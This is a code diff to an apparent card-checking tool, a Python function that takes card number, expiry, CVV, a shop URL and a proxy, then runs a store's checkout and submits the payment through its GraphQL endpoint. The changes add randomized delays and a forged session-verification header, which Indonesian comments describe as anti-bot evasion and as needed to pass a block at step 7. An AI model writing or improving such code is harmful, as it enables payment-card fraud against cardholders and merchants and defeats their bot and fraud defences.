@@ -382,7 +382,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             
             try:
                 await session.get(f"{ourl}/checkout", headers=checkout_headers)
-                await asyncio.sleep(random.uniform(1.0, 2.0))
+                await asyncio.sleep(random.uniform(1.0, 2.0)) # Delay anti-bot
                 resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'}, allow_redirects=True)
                 checkout_url = str(resp.url)
                 text = resp.text
@@ -478,7 +478,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 await queue.put({"type": "log", "msg": f"[ERROR STEP 6] Tokenization failed: {token_error}"})
                 return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
-            await asyncio.sleep(random.uniform(2.0, 4.0))
+            await asyncio.sleep(random.uniform(2.0, 4.0)) # DELAY ANTI-BOT KETAT SEBELUM GRAPHQL
 
             await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
@@ -497,7 +497,8 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 'Sec-Fetch-Site': 'same-origin',
                 'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                 'Sec-Ch-Ua-Mobile': '?0',
-                'Sec-Ch-Ua-Platform': '"Windows"'
+                'Sec-Ch-Ua-Platform': '"Windows"',
+                'X-Checkout-One-Session-Token-Verified': 'true' # WAJIB UNTUK LULUS BLOCK STEP 7
             }
 
             random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
@@ -589,7 +590,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                                                     'company': '',
                                                     'firstName': first_name,
                                                     'lastName': last_name,
-                                                    'zoneCode': b_state_short,
+                                            'zoneCode': b_state_short,
                                                     'phone': b_phone,
                                                 },
                                             },
